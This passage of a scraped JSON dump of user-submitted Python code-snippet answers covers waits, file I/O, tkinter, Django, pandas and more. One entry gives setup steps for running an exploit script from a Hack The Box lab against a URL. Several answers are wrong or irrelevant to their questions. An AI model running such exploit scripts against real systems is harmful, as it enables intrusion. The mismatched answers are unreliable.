    "keyword": null,
    "link": null,
    "title": " how to wait for a element to load in selenium",
    "description": "from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC  driver = webdriver.Firefox() driver.get(\"http://somedomain/url_that_delays_loading\") try:     element = WebDriverWait(driver, 10).until(       # Please Change These Down Below         EC.presence_of_element_located((By.AnyElementYouWant, \"ElementName\"))     ) finally:     driver.quit() \n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2029,
    "keyword": null,
    "link": null,
    "title": " how to wait in python",
    "description": "import time   # Wait for 5 seconds time.sleep(5)   # Wait for 300 milliseconds # .3 can also be used time.sleep(.300) \nimport time #Waits 1 second time.sleep(1)\nimport time  time.sleep(5) # sleeps for 5 seconds\n# You need to import time first import time #now you have time you can make time wait/sleep time.sleep(10) #time will wait/sleep for 10 seconds\nfrom time import sleep  >>> sleep(4)\n#Wait in python #Module required - time import time #Wait in for the time you put time.sleep(0.5) print('Wait in python')\n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2030,
    "keyword": null,
    "link": null,
    "title": " how to watermark a video using python",
    "description": "ffmpeg -i input.mp4 -i watermark.png -filter_complex \"overlay=1500:1000\" output.mp4\n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2031,
    "keyword": null,
    "link": null,
    "title": " how to write a font in pygame",
    "description": "import pygame pygame.init() window = pygame.display.set_mode((500, 500))   def set_text(string, coordx, coordy, fontSize): #Function to set text      font = pygame.font.Font('freesansbold.ttf', fontSize)      #(0, 0, 0) is black, to make black text     text = font.render(string, True, (0, 0, 0))      textRect = text.get_rect()     textRect.center = (coordx, coordy)      return (text, textRect)  window.fill((255, 255, 255)) #Fills the whole window with white #Places \"Text in Pygame!\" with an x,y coord of 250, 250 and 60 font size totalText = set_text(\"Text in Pygame!\", 250, 250, 60) window.blit(totalText[0], totalText[1]) pygame.display.update()\nfont = pygame.font.SysFont(None, 24) img = font.render('hello', True, BLUE) screen.blit(img, (20, 20))\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2032,
    "keyword": null,
    "link": null,
    "title": " how to write csv from a dataframe pythin",
    "description": "df.to_csv('file_name.csv')\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2033,
    "keyword": null,
    "link": null,
    "title": " how to write text on screen in python",
    "description": "print(\"Python\")\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2034,
    "keyword": null,
    "link": null,
    "title": " how to write to a text file in python",
    "description": "file = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \n#the way i learned it #plus explanations  from sys import * #this is for making it more flexible  #so now we gotta open a file to write in  f = open(\"haha.txt\", \"w\") # the w means WRITING #now we gotta write something  f.write(str(argv[1])) # the str means change it into a string of letters #argv[1] means it's the thing you type after the python run thing #for example: \"python run.py helo\"  #now we gotta finish it f.close()  #if you want to see whats in it...  f = open(\"haha.txt\", \"r\") #r means READING print(f.read()) # this prints what you wrote  #example input and output  #            python run.py helo #   helo\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2035,
    "keyword": null,
    "link": null,
    "title": " how to write to the end of a file in python",
    "description": "with open(filename, \"a+\") as f:   f.write('Hello World')\n# Open a file with access mode 'a' file_object = open('sample.txt', 'a')   # Append 'hello' at the end of file file_object.write('hello')   # Close the file file_object.close() \nfile = open('sample.txt', 'a') #the important part is to open it in mode 'a' #when you open a file in mode 'a' it start writing at the end of it file.write(\"yes you are\")    #lets say the file contained this string \"i am a file \" #so after we executed line 3 the string will be \"i am a file yes you are\"\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2036,
    "keyword": null,
    "link": null,
    "title": " how to write words on any other apps in python",
    "description": "import pyautogui print(pyautogui.press('I'))\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2037,
    "keyword": null,
    "link": null,
    "title": " how to write your first python program",
    "description": "# The basics are messages such as Hello World which is displayed in the shell window. # The line of code bellow is used to show strings or integers in the python terminal window. print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2038,
    "keyword": null,
    "link": null,
    "title": " how todelete a line in python",
    "description": "I dunno; but I think Stack Overflow does. Scroll down to find it.\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2039,
    "keyword": null,
    "link": null,
    "title": " howt to make caluclator in python",
    "description": "# Program make a simple calculator  # This function adds two numbers def add(x, y):     return x + y  # This function subtracts two numbers def subtract(x, y):     return x - y  # This function multiplies two numbers def multiply(x, y):     return x * y  # This function divides two numbers def divide(x, y):     return x / y   print(\"Select operation.\") print(\"1.Add\") print(\"2.Subtract\") print(\"3.Multiply\") print(\"4.Divide\")  while True:     # Take input from the user     choice = input(\"Enter choice(1/2/3/4): \")      # Check if choice is one of the four options     if choice in ('1', '2', '3', '4'):         num1 = float(input(\"Enter first number: \"))         num2 = float(input(\"Enter second number: \"))          if choice == '1':             print(num1, \"+\", num2, \"=\", add(num1, num2))          elif choice == '2':             print(num1, \"-\", num2, \"=\", subtract(num1, num2))          elif choice == '3':             print(num1, \"*\", num2, \"=\", multiply(num1, num2))          elif choice == '4':             print(num1, \"/\", num2, \"=\", divide(num1, num2))         break     else:         print(\"Invalid Input\")\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2040,
    "keyword": null,
    "link": null,
    "title": " httpie on windows",
    "description": "python -m pip install --upgrade pip\npip install --upgrade pip setuptools pip install --upgrade httpie\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2041,
    "keyword": null,
    "link": null,
    "title": " human readable time difference python",
    "description": "# pip install humanize import humanize  date = datetime(2021, 6, 2, 8, 15, 0) now = datetime.now()  humanize.precisedelta(date - now, minimum_unit=\"seconds\", format=\"%d\") # '9 hours, 28 minutes and 59 seconds'\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2042,
    "keyword": null,
    "link": null,
    "title": " hwo much does mano house cost in python",
    "description": "Free\n",
    "reg_date": "2021-10-12T11:31:04.000Z"
  },
  {
    "id": 2043,
    "keyword": null,
    "link": null,
    "title": " hwo to creat a stopwatch using python",
    "description": "# Create a stopwatch  # Import a module called as time  import time  # create all the variables  day = 0 hour = 0 min = 0 sec = 0  # Display the headings  print(\"D - H - M - S\") print()  # Create an infinite loop  while True:      # Create the main part of the stopwatch      time.sleep(1)      if sec == 59:        sec = -1        min = min + 1      sec = sec + 1     if min == 60:         min = 0         hour = hour + 1      if hour == 24:         hour = 0         day = day + 1     print(day, \"-\", hour, \"-\", min, \"-\", sec)     \n  import time  now = time.time() future = now + 10 while time.time() < future:     # do stuff     pass\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2044,
    "keyword": null,
    "link": null,
    "title": " hwo to separate datetime column into date and time pandas",
    "description": "import pandas as pd df = pd.read_csv(file_path)  df['Dates'] = pd.to_datetime(df['date']).dt.date df['Time'] = pd.to_datetime(df['date']).dt.time\ndf = pd.DataFrame({'my_timestamp': pd.date_range('2016-1-1 15:00', periods=5)})  >>> df          my_timestamp 0 2016-01-01 15:00:00 1 2016-01-02 15:00:00 2 2016-01-03 15:00:00 3 2016-01-04 15:00:00 4 2016-01-05 15:00:00  df['new_date'] = [d.date() for d in df['my_timestamp']] df['new_time'] = [d.time() for d in df['my_timestamp']]  >>> df          my_timestamp    new_date  new_time 0 2016-01-01 15:00:00  2016-01-01  15:00:00 1 2016-01-02 15:00:00  2016-01-02  15:00:00 2 2016-01-03 15:00:00  2016-01-03  15:00:00 3 2016-01-04 15:00:00  2016-01-04  15:00:00 4 2016-01-05 15:00:00  2016-01-05  15:00:00\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2045,
    "keyword": null,
    "link": null,
    "title": " hyperlinks in jupyter notebook",
    "description": "[blue_text](url_here)\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2046,
    "keyword": null,
    "link": null,
    "title": " ibid meaning in hindi",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2047,
    "keyword": null,
    "link": null,
    "title": " idle shell 3.9.1 download",
    "description": "print(\"Hello World\")\nStep 1: Download Python newest version from   https://www.python.org/downloads/  Step 2:Install Python Step 3:Download Pycharm Community free version Step 4:Install and open Pycharm Step 5:Write print(\"Hello New World\")   //Hurray you are about to start python\npython 3.9.2 (tags/v3.9.2:la79785, feb 19 2021, 13:44:55) [MSV v.1928 64 bit (AMD64)] on win32 \n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2048,
    "keyword": null,
    "link": null,
    "title": " if   name   == '  main  '",
    "description": "if __name__ == \"__main__\":\n# If the python interpreter is running that module (the source file) # as the main program, it sets the special __name__ variable to have # a value &ldquo;__main__&rdquo;. If this file is being imported from another  # module, __name__ will be set to the module&rsquo;s name. if __name__=='__main__':   # do something\n# It's as if the interpreter inserts this at the top # of your module when run as the main program. __name__ = \"__main__\" \n# Suppose this is foo.py.  print(\"before import\") import math  print(\"before functionA\") def functionA():     print(\"Function A\")  print(\"before functionB\") def functionB():     print(\"Function B {}\".format(math.sqrt(100)))  print(\"before __name__ guard\") if __name__ == '__main__':     functionA()     functionB() print(\"after __name__ guard\")\npython foo.py\nif __name__ == \"__main__\": main()\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2049,
    "keyword": null,
    "link": null,
    "title": " if dir not exist mkdir python",
    "description": "import os if not os.path.exists('my_folder'):     os.makedirs('my_folder')\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2050,
    "keyword": null,
    "link": null,
    "title": " if django",
    "description": "{% if athlete_list %}     Number of athletes: {{ athlete_list|length }} {% elif athlete_in_locker_room_list %}     Athletes should be out of the locker room soon! {% else %}     No athletes. {% endif %}\n#views.py #You should instead pass places_count via the context to the template: def places(request):     places = Places.objects.order_by('-published_date')[:10]     places_count = Places.objects.count()     return render(         request, 'templates/places.html', {'places':places, 'places_count': places_count}     ) #in your templatee <div class=\"container\">     <h2>Places <span class=\"badge\">{{ places_count }}</span></h2> </div>\n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2051,
    "keyword": null,
    "link": null,
    "title": " if else condition in kusto",
    "description": "T  | extend day = iff(floor(Timestamp, 1d)==floor(now(), 1d), \"today\", \"anotherday\") \n",
    "reg_date": "2021-10-12T11:31:05.000Z"
  },
  {
    "id": 2052,
    "keyword": null,
    "link": null,
    "title": " if file exists delete python",
    "description": "import os filePath = '/home/somedir/Documents/python/logs'  if os.path.exists(filePath):     os.remove(filePath) else:     print(\"Can not delete the file as it doesn't exists\")\nimport os os.remove(\"filename.txt\")\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2053,
    "keyword": null,
    "link": null,
    "title": " if list item is found in string get that item python",
    "description": "if any(x in string_to_search for x in listThat_contains_x):     print(x)\nif any(ext in url_string for ext in extensionsToCheck):     print(url_string)\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2054,
    "keyword": null,
    "link": null,
    "title": " if none in column remove row",
    "description": "import pandas as pd df = df[pd.notnull(df['Gender'])] \n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2055,
    "keyword": null,
    "link": null,
    "title": " if statement with radio button python",
    "description": "from tkinter import *  root = Tk()  i = IntVar() #Basically Links Any Radiobutton With The Variable=i. r1 = Radiobutton(root, text=\"option 1\", value=1, variable=i) r2 = Radiobutton(root, text=\"option 2\", value=2, variable=i) # \"\"\" If both values where equal, when one of the buttons are pressed all buttons would be pressed. If a button is pressed its value is true, or 1. If you want to acess the data from the radiobuttons, use a if statment like \"\"\" if (i.get() ==1):        print(\"you picked option1\") else:         print(\"you picked option2\")          # :)  r1.pack() r2.pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2056,
    "keyword": null,
    "link": null,
    "title": " if type is string python",
    "description": "isinstance(s, str)\n# python 2 isinstance(s, basestring)  # python 3 isinstance(s, str)\ntype('hello world') == str # output: True  type(10) == str # output: False\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2057,
    "keyword": null,
    "link": null,
    "title": " ignore bad lines pandas",
    "description": "import pandas as pd dataFrame = pd.read_csv('path_to_file.csv',error_bad_lines=False)\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2058,
    "keyword": null,
    "link": null,
    "title": " ignore warnings python",
    "description": "import warnings warnings.filterwarnings(\"ignore\")\nimport warnings  warnings.filterwarnings(action= 'ignore')\nimport warnings  def fxn():     warnings.warn(\"deprecated\", DeprecationWarning)  with warnings.catch_warnings():     warnings.simplefilter(\"ignore\")     fxn()\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2059,
    "keyword": null,
    "link": null,
    "title": " image hash python",
    "description": "from PIL import Image  def image_average_hash(img):     hash = []     for x in range(16): hash.append([0, 0, 0])     for x2 in range(4):         for x in range(math.floor(img.size[0] / 4)):             for y2 in range(4):                 for y in range(math.floor(img.size[1] / 4)):                     px = img.getpixel((x + x2 * 4, y + y2 * 4))                     for z in range(3): hash[x2 * 4 + y2][z] += px[z]     for x in range(16):          for y in range(3): hash[x][y] = hash[x][y] / (math.floor(img.size[0] / 4) * math.floor(img.size[1] / 4))         hash[x] = hex(math.floor(sum(hash[x]) / 3)); hash[x] = hash[x][hash[x].index(\"x\") + 1:]         if len(hash[x]) != 2: hash[x] = \"0\" + hash[x]     return \"\".join(map(str, hash))    image = Image.new(\"RGB\", (100, 100), color = \"black\") print(image_average_hash(image))\n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2060,
    "keyword": null,
    "link": null,
    "title": " image in tkinter",
    "description": "from tkinter import * root=Tk() img=PhotoImage(file='sunshine.jpg') Label(root,image=img).pack() root.mainloop()\npip install Pillow\nimport tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\nimport tkinter  from PIL import Image, ImageTk  load= Image.open(\"/Users/omprakash/Desktop/Gmail-new-logo.jpg\") render = ImageTk.PhotoImage(load) img = Label(root, image=render) img.place(x=100, y=100) \nfrom tkinter import * from PIL import ImageTk, Image  root = Tk()  c = Canvas(root, width=500, height=500) c.pack()  img = ImageTk.PhotoImage(Image.open(r\"imagepath\\imagename.extension\")) c.create_image(x, y, image=img, anchor=NW)\nimport tkinter as tk window = tk() canvas = Canvas(window, width=300, height=300) image = PhotoImage('path') canvas.create_image(height=40, width=40, img=image) \n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2061,
    "keyword": null,
    "link": null,
    "title": " image tkinter",
    "description": "pip install Pillow\nimport tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\nimport tkinter  from PIL import Image, ImageTk  load= Image.open(\"/Users/omprakash/Desktop/Gmail-new-logo.jpg\") render = ImageTk.PhotoImage(load) img = Label(root, image=render) img.place(x=100, y=100) \nfrom tkinter import *       root = Tk()       canvas = Canvas(root, width = 300, height = 300)       canvas.pack()       img = PhotoImage(file=\"ball.ppm\")       canvas.create_image(20,20, anchor=NW, image=img)       mainloop() \nimport tkinter as tk window = tk() canvas = Canvas(window, width=300, height=300) image = PhotoImage('path') canvas.create_image(height=40, width=40, img=image) \n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2062,
    "keyword": null,
    "link": null,
    "title": " image to text python",
    "description": "from PIL import Image import pytesseract  image = 'PATH/TO/IMAGE' text = pytesseract.image_to_string(Image.open(image), lang=\"eng\") print(text)  # Code From here: https://www.youtube.com/watch?v=kxHp5ng6Rgw\n# Import some modules import cv2 # An image proccessing library import pytesseract # an image to text library import numpy as np # used for mathematics but can be used in image proccessing  # Configure the module pytesseract.pytesseract.tesseract_cmd = r'C:\\Users\\yourname\\AppData\\Local\\Tesseract-OCR\\tesseract.exe'  # Make the image grey img = cv2.imread('your_img.png') gray = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) gray, img_bin = cv2.threshold(gray, 128, 255, cv2.THRESH_BINARY | cv2.THRESH_OTSU) gray = cv2.bitwise_not(img_bin) kernel = np.ones((2, 1), np.uint8) img = cv2.erode(gray, kernel, iterations=1) img = cv2.dilate(img, kernel, iterations=1) # Use OCR to read the text from the image out_below = pytesseract.image_to_string(img) # Print the text print(out_below)\nfrom os import closerange from PIL import Image import pytesseract as tess tess.pytesseract.tessetact_cmd = r'give your PATH TO TESSETACT.EXE'  image = r'complete path to image file' text = tess.image_to_string(Image.open(image), lang=\"eng\") print(text)\nimport Image import ImageDraw import ImageFont  def getSize(txt, font):     testImg = Image.new('RGB', (1, 1))     testDraw = ImageDraw.Draw(testImg)     return testDraw.textsize(txt, font)  if __name__ == '__main__':      fontname = \"Arial.ttf\"     fontsize = 11        text = \"example@gmail.com\"          colorText = \"black\"     colorOutline = \"red\"     colorBackground = \"white\"       font = ImageFont.truetype(fontname, fontsize)     width, height = getSize(text, font)     img = Image.new('RGB', (width+4, height+4), colorBackground)     d = ImageDraw.Draw(img)     d.text((2, height/2), text, fill=colorText, font=font)     d.rectangle((0, 0, width+3, height+3), outline=colorOutline)          img.save(\"D:/image.png\") \n",
    "reg_date": "2021-10-12T11:31:06.000Z"
  },
  {
    "id": 2063,
    "keyword": null,
    "link": null,
    "title": " images from opencv displayed in blue",
    "description": "# matplotlib interprets images in RGB format, but OpenCV uses BGR format  # so to convert the image so that it's properly loaded, convert it before loading  img = cv2.imread('filename.ext')\t\t# this is read in BGR format rgb_img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\t\t# this converts it into RGB  plt.imshow(rgb_img) plt.show() \n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2064,
    "keyword": null,
    "link": null,
    "title": " images subplot python",
    "description": "_, axs = plt.subplots(n_row, n_col, figsize=(12, 12)) axs = axs.flatten() for img, ax in zip(imgs, axs):     ax.imshow(img) plt.show()\n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2065,
    "keyword": null,
    "link": null,
    "title": " import authenticate",
    "description": "from django.contrib.auth import authenticate\n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2066,
    "keyword": null,
    "link": null,
    "title": " import beautifulsoup",
    "description": "pip install beautifulsoup4\nfrom requests import get from bs4 import BeautifulSoup as bs  page = get(\"http://website.url/goes-here\") soup = bs(page.content, 'html.parser')\npip install bs4 #this'll do the work\n#start   from bs4 import BeautifulSoup import requests  req = requests.get('https://www.slickcharts.com/sp500') soup = BeautifulSoup(req.text, 'html.parser')\nfrom bs4 import BeautifulSoup import requests \nfrom bs4 import BeautifulSoup  with open(\"index.html\") as fp:     soup = BeautifulSoup(fp)  soup = BeautifulSoup(\"<html>a web page</html>\") \n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2067,
    "keyword": null,
    "link": null,
    "title": " import datetime",
    "description": "from datetime import datetime  date = datetime.now() print(date) # Prints in the format year, month, day, hour, minute, second, and microsecond\nfrom datetime import datetime as d date = d.now() print(date.strftime(\"%Y-%m-%d %H:%M:%S\"))\nimport datetime  x = datetime.datetime(2018, 9, 15)  print(x.strftime(\"%b %d %Y %H:%M:%S\")) \nimport datetime now = datetime.datetime.now() print(now.year, now.month, now.day, now.hour, now.minute, now.second)\n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2068,
    "keyword": null,
    "link": null,
    "title": " import excel file to python",
    "description": "import pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx', sheet_name='your Excel sheet name') print (df) \n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2069,
    "keyword": null,
    "link": null,
    "title": " import forms",
    "description": "from django import forms from django.contrib.auth.forms import UserCreationForm from django.contrib.auth.models import User   # Create your forms here.\n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2070,
    "keyword": null,
    "link": null,
    "title": " import keys selenium",
    "description": "from selenium.webdriver.common.keys import Keys\nfrom selenium import webdriver from selenium.webdriver.common.keys import Keys  driver = webdriver.Firefox() driver.get(\"http://www.python.org\") assert \"Python\" in driver.title elem = driver.find_element_by_name(\"q\") elem.clear() elem.send_keys(\"pycon\") elem.send_keys(Keys.RETURN) assert \"No results found.\" not in driver.page_source driver.close() \n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2071,
    "keyword": null,
    "link": null,
    "title": " import kfold",
    "description": "from sklearn.model_selection import KFold\nfrom sklearn.model_selection import GridSearchCV from sklearn.model_selection import KFold  # Regressor lrg = LinearRegression()  #Param Grid param_grid=[{  'normalize':[True, False]  }]  # Grid Search with KFold, not shuffled in this example experiment_gscv = GridSearchCV(lrg, param_grid, \\                                cv=KFold(n_splits=4, shuffle=False), \\                                scoring='neg_mean_squared_error')\n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2072,
    "keyword": null,
    "link": null,
    "title": " import matplotlib.pyplot as plt",
    "description": "from matplotlib import pyplot as plt  import matplotlib.pyplot as plt \nimport matplotlib.pyplot as plt\nimport matplotlib\nfrom matplotlib import pyplot as plt  import matplotlib.pyplot as plt1  print(dir(plt) == dir(plt1)) True\nimport numpy as np import matplotlib.pyplot as plt  x = np.arange(0, 5, 0.1); y = np.sin(x) plt.plot(x, y) \nplt.plot([1, 2, 3, 4], [1, 4, 9, 16]) # plot x against y\n",
    "reg_date": "2021-10-12T11:31:07.000Z"
  },
  {
    "id": 2073,
    "keyword": null,
    "link": null,
    "title": " import mean squared log error",
    "description": "from sklearn.metrics import mean_squared_log_error y_true = [3, 5, 2.5, 7] y_pred = [2.5, 5, 4, 8] mean_squared_log_error(y_true, y_pred) 0.039...\n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2074,
    "keyword": null,
    "link": null,
    "title": " import models",
    "description": "from django.db import models from django.contrib.auth.models import User\n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2075,
    "keyword": null,
    "link": null,
    "title": " import numpy python",
    "description": "import numpy as np\npy -m pip install numpy\nimport numpy  #or import numpy as np\ndef quicksort(arr):     if len(arr) <= 1:         return arr     pivot = arr[len(arr) // 2]     left = [x for x in arr if x < pivot]     middle = [x for x in arr if x == pivot]     right = [x for x in arr if x > pivot]     return quicksort(left) + middle + quicksort(right)  print(quicksort([3,6,8,10,1,2,1])) # Prints \"[1, 1, 2, 3, 6, 8, 10]\" \n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2076,
    "keyword": null,
    "link": null,
    "title": " import pandas",
    "description": "import pandas as pd\nimport pandas as pd  url = 'random .csv file link'  df = pd.read_csv(url)   # Pandas is an open source Python package that is most widely used for data science/data analysis and machine learning tasks\nyou should be in the same dir as .py file   df = pd.read_csv('your_file_name.csv')\n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2077,
    "keyword": null,
    "link": null,
    "title": " import py to exe",
    "description": "$ pip install auto-py-to-exe \nHold shift and right click where your python file is located and then type  pyinstaller 'fileName.py' to convert to a simple exe file the exe file will be in your dist folder  pyinstaller --onefile 'fileName.py' to convert to a onefile exe file the exe file will be in your dist folder  pyinstaller -w --onefile 'fileName.py' to convert to a onefile exe file and the python window will not appear  # {(NOTE: DON'T DO THIS IF YOU PROGRAM IS CONSOLE BASED)} # {(IF YOU HAVE MADE A GAME USING PYGAME OR USING ANYTHING ELSE #   WHERE CONSOLE IS NOT USED THEN IT'S FINE)} # For more help you can click the link bellow # It's 12 min tutorial of codewithharry \n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2078,
    "keyword": null,
    "link": null,
    "title": " import requests, sys, urllib, reImportError: No module named requests",
    "description": "Hack the box - buff   Guys, this problem took me 1 day to find the problem and the issue is the script needs python 2.7 and is missing libraries. You'll need to install them.  Open terminal: Install Python 2.7 sudo apt-get install python-pip  Install pip sudo pip install requests  Install colorama sudo pip install colorama  Run exploit: python exploitname.py url  Happy Hacking!  \n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2079,
    "keyword": null,
    "link": null,
    "title": " import reverse lazy",
    "description": "from django.urls import reverse_lazy\n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2080,
    "keyword": null,
    "link": null,
    "title": " import seaborn",
    "description": "import seaborn as sns\n#\"sns\" is the standard alias.  import seaborn as sns\n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2081,
    "keyword": null,
    "link": null,
    "title": " import settings",
    "description": "from django.conf import settings\n",
    "reg_date": "2021-10-12T11:31:08.000Z"
  },
  {
    "id": 2082,
    "keyword": null,
    "link": null,
    "title": " import skbuild ModuleNotFoundError: No module named 'skbuild'",
    "description": "pip install scikit-build; pip install cmake \npip install scikit-build\n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2083,
    "keyword": null,
    "link": null,
    "title": " import sklearn.metrics from plot confusion matrix",
    "description": "from sklearn.metrics import plot_confusion_matrix\n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2084,
    "keyword": null,
    "link": null,
    "title": " import sklearn",
    "description": "pip install scikit-learn\nimport sklearn import pandas as pd from sklearn import datasets iris=datasets.iris() \nconda install scikit-learn=0.20\nimport nltk import sklearn  print('The nltk version is {}.'.format(nltk.__version__)) print('The scikit-learn version is {}.'.format(sklearn.__version__))  # The nltk version is 3.0.0. # The scikit-learn version is 0.15.2.\nsudo pip3 install scikit-learn\n# Define the model model1 = LogisticRegression()  # Check the name of the model # It is useful when we are dealing with many alternative models model1.__class__.__name__\n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2085,
    "keyword": null,
    "link": null,
    "title": " import tknter",
    "description": "import tkinter \n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2086,
    "keyword": null,
    "link": null,
    "title": " import user in django",
    "description": ">>> from django.contrib.auth.models import User >>> user = User.objects.create_user('john', 'lennon@thebeatles.com', 'johnpassword')  # At this point, user is a User object that has already been saved # to the database. You can continue to change its attributes # if you want to change other fields. >>> user.last_name = 'Lennon' >>> user.save() \nfrom django.contrib.auth import authenticate, login  def my_view(request):     username = request.POST['username']     password = request.POST['password']     user = authenticate(request, username=username, password=password)     if user is not None:         login(request, user)         # Redirect to a success page.         ...     else:         # Return an 'invalid login' error message.         ... \nfrom django.contrib.auth.mixins import LoginRequiredMixin  LOGIN_URL = 'your_url'\ndef sample_view(request):     current_user = request.user     print current_user.id\nfrom django.contrib.auth.mixins import LoginRequiredMixin  class MyView(LoginRequiredMixin, View):     login_url = '/login/'     redirect_field_name = 'redirect_to' \nmyuser.groups.set([group_list]) myuser.groups.add(group, group, ...) myuser.groups.remove(group, group, ...) myuser.groups.clear() myuser.user_permissions.set([permission_list]) myuser.user_permissions.add(permission, permission, ...) myuser.user_permissions.remove(permission, permission, ...) myuser.user_permissions.clear() \n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2087,
    "keyword": null,
    "link": null,
    "title": " import validation error in django",
    "description": "from django.core.exceptions import ValidationError\n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2088,
    "keyword": null,
    "link": null,
    "title": " importing financial data",
    "description": "#In your command prompt first run: pip install yfinance  import yfinance as yf  msft = yf.Ticker(\"MSFT\")  # get stock info msft.info  # get historical market data hist = msft.history(period=\"max\")  # show actions (dividends, splits) msft.actions  # show dividends msft.dividends  # show splits msft.splits  # show financials msft.financials msft.quarterly_financials  # show major holders msft.major_holders  # show institutional holders msft.institutional_holders  # show balance sheet msft.balance_sheet msft.quarterly_balance_sheet  # show cashflow msft.cashflow msft.quarterly_cashflow  # show earnings msft.earnings msft.quarterly_earnings  # show sustainability msft.sustainability  # show analysts recommendations msft.recommendations  # show next event (earnings, etc) msft.calendar  # show ISIN code - *experimental* # ISIN = International Securities Identification Number msft.isin  # show options expirations msft.options  # get option chain for specific expiration opt = msft.option_chain('YYYY-MM-DD') # data available via: opt.calls, opt.puts \n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2089,
    "keyword": null,
    "link": null,
    "title": " importlib.reload not working",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2090,
    "keyword": null,
    "link": null,
    "title": " importying listviewin django",
    "description": "from django.views.generic import ListView,TemplateView from django.views.generic.base import View from django.views.generic.detail import DetailView \n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2091,
    "keyword": null,
    "link": null,
    "title": " impute mode pandas",
